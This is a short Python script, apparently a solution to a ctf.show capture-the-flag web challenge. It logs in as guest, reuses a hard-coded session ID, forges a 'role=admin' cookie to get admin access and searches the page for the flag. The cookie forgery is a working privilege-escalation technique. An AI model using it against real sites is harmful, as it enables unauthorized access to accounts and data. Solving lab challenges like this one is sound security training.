import requests
import re

base_url = "http://2d86c2a0-1aa1-44cb-a59e-d4a8d347fe7f.challenge.ctf.show/"
login_url = base_url + "check.php"

s = requests.Session()
login_data = {"username":"guest", "password":"guest"}
resp = s.post(login_url, data=login_data, allow_redirects=True)

print("session中cookies: ", s.cookies.get_dict())

# 直接粘贴刚刚打印出来真实的PHPSESSID，不要留中文！
PHPSESSID = "4d58646f038e86f5584d5416eb895291"

headers = {
    "Cookie": f"PHPSESSID={PHPSESSID}; role=admin",
    "User-Agent": "Mozilla/5.0"
}

# 全新独立requests，不是s！
res = requests.get(base_url, headers=headers)

print(res.text)
m = re.search(r"CTF\{.*?\}", res.text)
if m:
    print("\n✅ FLAG:", m.group())